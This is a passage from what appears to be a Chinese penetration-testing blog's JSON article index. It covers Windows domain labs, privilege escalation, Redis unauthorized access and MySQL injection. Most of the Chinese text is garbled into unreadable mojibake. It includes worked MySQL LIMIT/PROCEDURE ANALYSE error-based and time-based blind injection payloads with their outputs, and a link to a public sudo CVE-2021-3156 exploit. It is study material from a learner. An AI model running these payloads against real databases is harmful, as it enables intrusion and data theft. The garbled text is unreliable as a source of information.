æˆ·èƒ½å¤Ÿè½»æ¾åœ°æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚Active Directoryä½¿ç”¨äº†ä¸€ç§ ç»“æ„åŒ–çš„æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåŸºç¡€å¯¹ç›®å½•ä¿¡æ¯è¿›è¡Œåˆä¹é€» è¾‘çš„åˆ†å±‚ç»„ç»‡ã€‚ç½‘ç»œå¯¹è±¡åˆ†ä¸º:ç”¨æˆ·ã€ç”¨","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"æ¸—é€ WindowsåŸŸ","slug":"æ¸—é€-WindowsåŸŸ","count":2,"path":"api/tags/æ¸—é€-WindowsåŸŸ.json"}]},{"title":"åˆæ¢WindowsåŸŸ1","slug":"WindowsDomain_1","date":"2021-03-07T07:22:18.000Z","updated":"2021-03-07T14:20:13.470Z","comments":true,"path":"api/articles/WindowsDomain_1.json","excerpt":"<h2 id=\"é…ç½®åˆ—è¡¨\"><a class=\"markdownIt-Anchor\" href=\"#é…ç½®åˆ—è¡¨\"></a> é…ç½®åˆ—è¡¨</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows 7 ä¸€å°</span><br><span class=\"line\">Windows 2003 ä¸€å°</span><br><span class=\"line\">Windows 2008 ä¸€å°</span><br><span class=\"line\">Windows 2012 ä¸€å°</span><br><span class=\"line\">Windows 2019 ä¸€å°</span><br></pre></td></tr></table></figure>","keywords":null,"cover":"../static/images/image-20210307153341420.png","content":null,"text":" é…ç½®åˆ—è¡¨1<br>2<br>3<br>4<br>5<br>Windows 7 ä¸€å°<br>Windows 2003 ä¸€å°<br>Windows 2008 ä¸€å°<br>Windows 2012 ä¸€å°<br>Windows 2019 ä¸€å°<br> åŸŸæ§ä¸»æœºé…ç½®æœ¬æ–‡ä½¿ç”¨Windows","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"æ¸—é€ WindowsåŸŸ","slug":"æ¸—é€-WindowsåŸŸ","count":2,"path":"api/tags/æ¸—é€-WindowsåŸŸ.json"}]},{"title":"ææƒæ€»ç»“","slug":"PrivilegeEscalation","date":"2021-03-05T07:22:18.000Z","updated":"2021-03-07T11:57:58.079Z","comments":true,"path":"api/articles/PrivilegeEscalation.json","excerpt":"<h1 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\"></a> Linux</h1>\n<p>å¸¸è§çš„ææƒæ–¹æ³•ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">suidææƒ</span><br><span class=\"line\">sudoææƒ     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156</span><br><span class=\"line\">è„ç‰›ææƒ</span><br><span class=\"line\">NFSææƒ     </span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":" Linuxå¸¸è§çš„ææƒæ–¹æ³•ï¼š1<br>2<br>3<br>4<br>suidææƒ<br>sudoææƒ     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156<br>è„ç‰›ææƒ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","count":1,"path":"api/tags/æ¸—é€.json"}]},{"title":"mysql æ³¨å…¥ç›¸å…³æ€»ç»“","slug":"mysql_conclude","date":"2021-03-01T15:56:43.000Z","updated":"2021-03-02T01:47:21.545Z","comments":true,"path":"api/articles/mysql_conclude.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210302000052954.png","content":"<h1 id=\"ä»æ³¨å…¥åˆ°webshell\"><a class=\"markdownIt-Anchor\" href=\"#ä»æ³¨å…¥åˆ°webshell\"></a> ä»æ³¨å…¥åˆ°webshell</h1>\n<h1 id=\"limitæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#limitæ³¨å…¥\"></a> Limitæ³¨å…¥</h1>\n<p>limitæ³¨å…¥çš„é™åˆ¶è¿˜æ˜¯æŒºå¤šçš„ã€‚</p>\n<p>é¦–å…ˆï¼Œlimitæ³¨å…¥åªå­˜åœ¨äºmysql 5.6.6ç‰ˆæœ¬ä»¥ä¸‹å½“ä¸­ã€‚</p>\n<p>mysqlåœ¨æ‰§è¡ŒæŸ¥è¯¢è¯­å¥æ—¶ï¼Œå¯åœ¨åé¢æ¥analyseè¯­å¥ï¼Œè€Œåœ¨5.6.6ç‰ˆæœ¬ä¹‹å‰ï¼Œanalyseè¯­å¥å¯ä»¥ä½¿ç”¨å‡½æ•°ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),extractvalue(rand(),concat(0x3a,version())));</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.62&#39;</span><br></pre></td></tr></table></figure>\n<p>5.6.6ç‰ˆæœ¬ä¹‹åï¼Œmysqlå®˜æ–¹å¯¹analyseè¯­å¥è¿›è¡Œäº†æ”¹å†™ï¼Œè¿™é‡Œåªèƒ½è¾“å…¥uintå‹çš„æ•°æ®ï¼š</p>\n<p><img src=\"../static/images/image-20210302000052954.png\" alt=\"image-20210302000052954\" /></p>\n<p>å› æ­¤5.6.6ä¹‹åå†åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä¼šäº§ç”ŸæŠ¥é”™ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from site LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;extractvalue(rand(),concat(0x3a,version())),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>è€Œå³ä¾¿å†5.5.xç‰ˆæœ¬ï¼Œå®æµ‹åœ¨5.5.41ç‰ˆæœ¬ä¸­å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:0&#39;</span><br></pre></td></tr></table></figure>\n<p>ç„¶è€Œåœ¨5.5.62ç‰ˆæœ¬ä¸­ï¼Œæ— æ³•ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1); </span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯æŠ¥é”™æ³¨å…¥éƒ½æ˜¯å¯ä»¥ç”¨çš„ã€‚</p>\n<p>æ€»ç»“ï¼š</p>\n<p>åœ¨mysql 5.6.6ç‰ˆæœ¬ä¹‹å‰ï¼Œä½¿ç”¨analyseå‡½æ•°æ—¶å¯ä»¥åˆ©ç”¨extractvalueå‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œè€Œåœ¨è¾ƒä½çš„ç‰ˆæœ¬ä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨benchmarké…åˆextractvalueåœ¨æ— å›æ˜¾ä¸‹è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œè€Œåœ¨è¾ƒé«˜ç‰ˆæœ¬ï¼ˆè‡³å°‘5.5.62ç‰ˆæœ¬åŠä¹‹åï¼‰ï¼Œæ˜¯ä¸å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨çš„ã€‚</p>\n<h1 id=\"æœªå®Œå¾…ç»­\"><a class=\"markdownIt-Anchor\" href=\"#æœªå®Œå¾…ç»­\"></a> æœªå®Œå¾…ç»­â€¦â€¦</h1>\n","text":" ä»æ³¨å…¥åˆ°webshell Limitæ³¨å…¥limitæ³¨å…¥çš„é™åˆ¶è¿˜æ˜¯æŒºå¤šçš„ã€‚é¦–å…ˆï¼Œlimitæ³¨å…¥åªå­˜åœ¨äºmysql 5.6.6ç‰ˆæœ¬ä»¥ä¸‹å½“ä¸­ã€‚mysqlåœ¨æ‰§è¡ŒæŸ¥è¯¢è¯­å¥æ—¶ï¼Œå¯åœ¨åé¢æ¥analyseè¯­å¥ï¼Œè€Œåœ¨5.6.6ç‰ˆæœ¬ä¹‹å‰ï¼Œanalyseè¯­å¥å¯ä»¥ä½¿ç”¨å‡½æ•°ï¼š1<br>2<br>mysq","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"vulnstack2é¶åœºé€šå…³ç¬”è®°","slug":"vulnstack2","date":"2021-03-01T08:35:59.000Z","updated":"2021-03-01T10:09:01.245Z","comments":true,"path":"api/articles/vulnstack2.json","excerpt":"<h2 id=\"ç¯å¢ƒä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒä»‹ç»\"></a> ç¯å¢ƒä»‹ç»</h2>\n<p>â€‹\tä¸‰ä¸ªé¶æœºï¼Œåˆ†åˆ«ä¸ºï¼š</p>\n<p>â€‹\t\tDC æœºï¼š å†…ç½‘ip 10.10.10.10 Windows 2012</p>\n<p>â€‹\t\tWEBï¼š   å†…ç½‘ip 10.10.10.80     å¤–ç½‘ip 192.168.111.80      Windows 2008</p>\n<p>â€‹\t\tPCï¼š       å†…ç½‘ip 10.10.10.201  å¤–ç½‘ip 192.168.111.201\tWindows7</p>","keywords":null,"cover":"../static/images/image-20210301170011107.png","content":null,"text":" ç¯å¢ƒä»‹ç»â€‹\tä¸‰ä¸ªé¶æœºï¼Œåˆ†åˆ«ä¸ºï¼šâ€‹\t\tDC æœºï¼š å†…ç½‘ip 10.10.10.10 Windows 2012â€‹\t\tWEBï¼š   å†…ç½‘ip 10.10.10.80     å¤–ç½‘ip 192.168.111.80      Windows 2008â€‹\t\tPCï¼š       å†…ç½‘ip ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"TODOï¼ˆæŒç»­æ›´æ–°ï¼‰","slug":"knowledge","date":"2021-02-28T07:08:03.000Z","updated":"2021-03-09T06:24:01.005Z","comments":true,"path":"api/articles/knowledge.json","excerpt":"","keywords":null,"cover":null,"content":"<p>åŒæºç­–ç•¥æ€»ç»“</p>\n<p>â€‹\tCORS</p>\n<p>â€‹\tjsonp</p>\n<p>â€‹\tcsrf</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/rce_conclude\">RCEæ€»ç»“</a><br />\nâˆš java<br />\nâˆš nodejs</p>\n<p>â€‹\tgolang</p>\n<p>â€‹\tphp</p>\n<p>sqlæ³¨å…¥</p>\n<p>â€‹\t <a href=\"https://blog.b0ring.cf/#/posts/mysql_conclude\">mysql</a></p>\n<p>â€‹\t\tâˆš limit æ³¨å…¥</p>\n<p>â€‹\t\tgetshell æ–¹æ³•</p>\n<p>â€‹\t\torder by æ³¨å…¥</p>\n<p>â€‹\t\tæ–‡ä»¶è¯»å†™å‡½æ•°</p>\n<p>â€‹\t\tudfææƒ</p>\n<p>â€‹\tsqlserver</p>\n<p>â€‹\t\tgetshell æ–¹æ³•</p>\n<p>â€‹\t\tæ–‡ä»¶è¯»å†™æ–¹æ³•</p>\n<p>â€‹\t\tææƒæ–¹æ³•</p>\n<p>â€‹\tOracle</p>\n<p>â€‹\t\torder byæ³¨å…¥</p>\n<p>å†…ç½‘æ¸—é€</p>\n<p>â€‹\tå…æ€</p>\n<p>â€‹\tåŸŸæ¸—é€</p>\n<p>â€‹\t\tâˆš <a href=\"https://blog.b0ring.cf/#/posts/WindowsDomain_1\">åŸŸæ­å»º</a></p>\n<p>â€‹\t\tâˆš åŸŸè®¤è¯ï¼ˆ<a href=\"https://blog.b0ring.cf/#/posts/WindowsDomain_2\">NTLMå’ŒKerberos</a>ï¼Œ<a href=\"https://blog.b0ring.cf/#/posts/PrivilegeEscalation\">Windows Access Token</a>ï¼‰</p>\n<p>â€‹\tåå¼¹shell</p>\n<p>â€‹\tå†…ç½‘è½¬å‘</p>\n<p>â€‹\tâˆš <a href=\"https://blog.b0ring.cf/#/posts/PrivilegeEscalation\">æƒé™æå‡</a></p>\n<p>â€‹\tæƒé™ç»´æŒ</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">redis</a><br />\nâˆš webshell<br />\nâˆš sshå…¬é’¥ç™»å½•<br />\nâˆš è®¡åˆ’ä»»åŠ¡<br />\nâˆš ä¸»ä»å¤åˆ¶getshell</p>\n<p>å…¶ä»–webç»„ä»¶</p>\n<p>â€‹\tslor</p>\n<p>â€‹\tshiro</p>\n<p>â€‹\tweblogic</p>\n<p>â€‹\tStruts2</p>\n<p>å¼€æºcmsåˆ†æ</p>\n<p>â€‹\tthinkphp</p>\n<p>ssrf</p>\n<p>â€‹\tä¸åŒè¯­è¨€ä¸‹çš„ç‰¹ç‚¹</p>\n<p>â€‹\tç»•è¿‡æ–¹æ³•</p>\n<p>vulnstacké¶æœºæ€»ç»“ï¼ˆ1~7ï¼‰<br />\nå·²å®Œæˆï¼š<a src=\"https://blog.b0ring.cf/#/posts/vulnstack2\">2</a></p>\n","text":"åŒæºç­–ç•¥æ€»ç»“â€‹\tCORSâ€‹\tjsonpâ€‹\tcsrfRCEæ€»ç»“<br />âˆš java<br />âˆš nodejsâ€‹\tgolangâ€‹\tphpsqlæ³¨å…¥â€‹\t mysqlâ€‹\t\tâˆš limit æ³¨å…¥â€‹\t\tgetshell æ–¹æ³•â€‹\t\torder by æ³¨å…¥â€‹\t\tæ–‡ä»¶è¯»å†™å‡½æ•°â€‹\t\tudfææƒ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"RCEå‡½æ•°æ€»ç»“","slug":"rce_conclude","date":"2021-02-27T10:10:29.000Z","updated":"2021-02-27T14:38:20.186Z","comments":true,"path":"api/articles/rce_conclude.json","excerpt":"<p>æœ€è¿‘ç”±äºé¢è¯•ï¼Œè¢«é¢è¯•å®˜æåˆ°äº†æ— æ³•å›ç­”çš„å…³äºå‘½ä»¤æ‰§è¡Œçš„é—®é¢˜ï¼Œé‚å†™æ­¤æ–‡æ€»ç»“å„è¯­è¨€RCEæ—¶æ‰€ç¢°åˆ°çš„å‡½æ•°å’Œç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼ŒæŸ¥æ¼è¡¥ç¼ºï¼Œä¹Ÿæ–¹ä¾¿è‡ªå·±ä»¥åä½¿ç”¨åˆ°çš„æ—¶å€™å¯ä»¥å¿«é€Ÿä½¿ç”¨ã€‚ï¼ˆåç»­å¯èƒ½æ ¹æ®ç§¯ç´¯æŒç»­æ›´æ–°ï¼‰</p>","keywords":null,"cover":"../static/images/image-20210227220806587.png","content":null,"text":"æœ€è¿‘ç”±äºé¢è¯•ï¼Œè¢«é¢è¯•å®˜æåˆ°äº†æ— æ³•å›ç­”çš„å…³äºå‘½ä»¤æ‰§è¡Œçš„é—®é¢˜ï¼Œé‚å†™æ­¤æ–‡æ€»ç»“å„è¯­è¨€RCEæ—¶æ‰€ç¢°åˆ°çš„å‡½æ•°å’Œç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼ŒæŸ¥æ¼è¡¥ç¼ºï¼Œä¹Ÿæ–¹ä¾¿è‡ªå·±ä»¥åä½¿ç”¨åˆ°çš„æ—¶å€™å¯ä»¥å¿«é€Ÿä½¿ç”¨ã€‚ï¼ˆåç»­å¯èƒ½æ ¹æ®ç§¯ç´¯æŒç»­æ›´æ–°ï¼‰ NodeJsnodejsçš„å‡ ä¸ªå¯ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šchild_process.spawn1","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"Redisæœªæˆæƒè®¿é—®","slug":"redisæœªæˆæƒè®¿é—®","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-26T02:36:00.724Z","comments":true,"path":"api/articles/redisæœªæˆæƒè®¿é—®.json","excerpt":"<h1 id=\"nginxphpredisç¯å¢ƒæ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredisç¯å¢ƒæ­å»º\"></a> Nginx+PHP+Redisç¯å¢ƒæ­å»º</h1>\n<p>ç¯å¢ƒæ­å»ºäºarchï¼Œåˆ©ç”¨auræ­å»ºçš„æ‰€ä»¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œç³»ç»Ÿä¸ä¸€æ ·çš„è¯·è‡ªè¡Œä¿®æ”¹æ­å»ºæ­¥éª¤ï¼ˆä¹Ÿä¸éš¾ï¼Œè¿™é‡Œè®°å½•ä¸‹åªæ˜¯ä¸ºäº†ç»™ä¸‹æ¬¡çœæ—¶é—´ï¼Œå…¶å®ä¸»è¦è¿˜æ˜¯æ”¹é…ç½®æ–‡ä»¶è´¹æ—¶é—´ï¼Œä¸åŒç³»ç»Ÿä¸€æ ·çš„ï¼‰</p>","keywords":null,"cover":"https://blog.b0ring.cf/static/images/image-20210223223810960.png","content":null,"text":" Nginx+PHP+Redisç¯å¢ƒæ­å»ºç¯å¢ƒæ­å»ºäºarchï¼Œåˆ©ç”¨auræ­å»ºçš„æ‰€ä»¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œç³»ç»Ÿä¸ä¸€æ ·çš„è¯·è‡ªè¡Œä¿®æ”¹æ­å»ºæ­¥éª¤ï¼ˆä¹Ÿä¸éš¾ï¼Œè¿™é‡Œè®°å½•ä¸‹åªæ˜¯ä¸ºäº†ç»™ä¸‹æ¬¡çœæ—¶é—´ï¼Œå…¶å®ä¸»è¦è¿˜æ˜¯æ”¹é…ç½®æ–‡ä»¶è´¹æ—¶é—´ï¼Œä¸åŒç³»ç»Ÿä¸€æ ·çš„ï¼‰Nginxç¯å¢ƒæ­å»ºï¼š1<br>yay -S nginx<br>ä¿®æ”¹é…ç½®æ–‡","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]}]}